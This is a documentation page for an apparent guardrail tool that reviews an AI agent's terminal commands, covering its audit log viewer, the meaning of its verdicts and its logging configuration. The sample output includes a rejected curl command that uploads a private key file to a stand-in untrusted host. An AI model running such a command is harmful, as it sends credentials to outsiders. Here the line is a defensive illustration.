# Audit approvals and rejections

The installer enables a private JSONL decision log for each workspace. It records proposed terminal commands, Guardian's verdict and rationale, the working directory and its source, timestamp, session/request IDs, model and risk/authorization metadata. Other tools are recorded by name and a relevant target path where available; complete file contents, full tool arguments and conversation transcripts are not copied into the audit log.

If you installed before this feature was added, rerun the normal installer once. New records begin when logging is enabled; earlier commands cannot be recovered from old verdict hashes.

## View decisions

From the registered workspace:

```bash
"$HOME/.local/share/antigravity-guardian/audit.sh"
```

Typical output:

```text
2026-10-25T21:00:00.000+00:00  APPROVED  run_command
  npm test
  cwd: /home/me/project
  reason: The command runs the requested local tests.

2026-10-25T21:01:00.000+00:00  REJECTED  run_command
  curl --data-binary @/private/key https://untrusted.example/upload
  cwd: /home/me/project
  reason: The proposed action exports credentials to an untrusted destination.
```

These are illustrative records, not commands to execute. Newlines and terminal control characters are escaped by the viewer.

Watch new decisions:

```bash
"$HOME/.local/share/antigravity-guardian/audit.sh" --follow
```

Show only policy rejections:

```bash
"$HOME/.local/share/antigravity-guardian/audit.sh" --decision rejected
```

Other options:

```bash
./audit.sh /path/to/project --decision approved --last 50
./audit.sh /path/to/project --decision errors
./audit.sh /path/to/project --json
./audit.sh --config /path/to/operator-config.json --follow
```

The viewer needs no model access, Rust toolchain or active review process. It defaults to the latest 20 matching records. It can still read a normal workspace log after uninstall because configs and logs are retained; use `--config` for a removed custom installation.

## What the verdict means

- `APPROVED`: Guardian returned a valid allow assessment and the bridge's authorization checks passed.
- `REJECTED`: Guardian returned a valid deny assessment.
- `ERROR`: Review could not be completed, or the proposed approval failed a bridge check. Execution is blocked, but the error does not classify the action as unsafe.

The log records the bridge's approval decision. It does not prove that Antigravity executed the command: another permission rule may still block it, or execution may fail. Each record therefore has `execution_status: "not_observed"`.

The JSON record's `cwd_source` distinguishes explicit tool directories, inferred workspace directories and public CLI declarations. An inferred workspace is not proof of the executor's actual cwd; see [context and limitations](context-and-limitations.md).

Authorization changes during review are logged as errors, not approvals. Dry-run `prepare` calls and installer connectivity probes do not create action-decision records.

## Location and configuration

By default, a workspace config named `WORKSPACE_ID.json` has a sibling log named `WORKSPACE_ID.audit.jsonl` under `~/.config/antigravity-guardian/workspaces/`. The installer prints its actual location and honors `XDG_CONFIG_HOME`.

The operator config controls logging:

```json
{
  "audit_path": "/absolute/private/path/workspace.audit.jsonl",
  "audit_details": true
}
```

`audit_details: true` records command text and reviewer reasons. Set it to `false` for metadata-only records, which omit command text and free-text reasons. Set `audit_path` to `null` to disable logging. The installer preserves explicit operator settings on later runs.

Logs are user-owned files with mode `0600`, outside the agent workspace by default. Commands and rationales can contain sensitive information present in command arguments; keep these files private. No log upload is performed. Historical metadata-only entries remain readable but show `<details not recorded>`.

Writes are serialized so concurrent reviews do not interleave JSON records. A configured log that cannot be written blocks approval and reports an audit error. A missing/unreadable operator config cannot provide a trusted audit destination, so such startup failures may only appear in hook stderr. An incomplete final record must be repaired or archived before logging can resume.

These are local audit records, not tamper-proof attestations. The account owning the files can modify them. Uninstall preserves logs; archive or remove them separately according to your retention needs.
